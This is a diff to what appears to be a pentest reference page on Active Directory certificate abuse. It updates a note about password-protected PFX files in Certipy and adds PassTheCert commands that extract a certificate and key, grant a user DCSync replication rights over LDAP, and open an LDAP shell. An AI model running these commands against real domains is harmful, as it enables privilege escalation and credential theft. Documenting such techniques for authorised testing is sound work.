@@ -33,13 +33,28 @@ Type help for list of commands
 
 <Callout type="info">
 
-Notes that Certipy's commands don't support PFXs with password. The following command can be used to "unprotect" a PFX file.
+Older Certipy versions did not support password-protected PFXs (current Certipy accepts `-password` on `certipy auth`). Otherwise, the following command can "unprotect" a PFX file.
 
 ```bash
 certipy cert -export -pfx <PATH_TO_PFX_CERT> -password <CERT_PASSWORD> -out <unprotected.pfx>
 ```
 
 </Callout>
+
+[PassTheCert](https://github.com/AlmondOffSec/PassTheCert/) (Python) authenticates to LDAP over Schannel and exposes higher-level actions. Extract the cert and key from the PFX first, then run an action:
+
+```bash
+# Extract cert and key from the PFX
+certipy cert -pfx user.pfx -nokey -out user.crt
+certipy cert -pfx user.pfx -nocert -out user.key
+
+# Elevate a target user (adds the replication rights needed for DCSync, if the
+# certificate's account can write the target's DACL)
+passthecert.py -action modify_user -crt user.crt -key user.key -domain "$DOMAIN" -dc-ip "$DC_IP" -target "$USER" -elevate
+
+# Or drop into an interactive LDAP shell
+passthecert.py -action ldap-shell -crt user.crt -key user.key -domain "$DOMAIN" -dc-ip "$DC_IP"
+```
 
 </Tab>
 
